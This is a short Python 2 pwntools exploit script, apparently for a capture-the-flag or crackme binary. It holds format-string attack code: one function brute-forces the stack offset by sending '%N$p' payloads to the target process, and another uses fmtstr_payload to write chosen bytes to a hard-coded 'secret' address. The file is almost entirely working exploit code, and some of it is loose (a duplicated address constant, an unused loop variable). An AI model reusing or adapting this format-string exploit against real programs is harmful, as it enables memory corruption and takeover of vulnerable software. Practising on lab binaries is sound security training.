#!/usr/bin/env python2

import os
import re
import sys

from pwn import *

context.arch = "x86"
context.bits = 32

secretAddr = 0x0804a050
exe = "./target"

def findOffset():
    padding = "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaa" 
    addr = "AAAA"
    searchFor = hex(unpack("AAAA"))
    retval = 0
    for i in range(1, 200):
        p = process(exe)
        myformat = "%{}$p".format(i)
        payload = padding+addr+myformat
        p.sendline(payload)
        log.info("payload = %s" % repr(payload))
        if p.recvregex(searchFor):
            retval = i
            break;
        p.close()
    print "Offset is {}".format(retval)
    return retval

secretAddr = 0x0804a050
writes = {secretAddr:   0xee,
          secretAddr+4: 0xff,
          secretAddr+8: 0xc0}

def jake():
    padding = "BB"
    addr = "AAAA"
    searchFor = hex(unpack("AAAA"))

    retval = 0
    for i in range(1, 20):
        p = process("./crackme0x00")
        myformat = "%{}$p".format(i)
        payload = padding+fmtstr_payload(15, writes, 15)
        p.sendline(payload)
        log.info("payload = %s" % repr(payload))
        log.info(i)
        print p.recvall()
        p.close()
    return retval

findOffset()
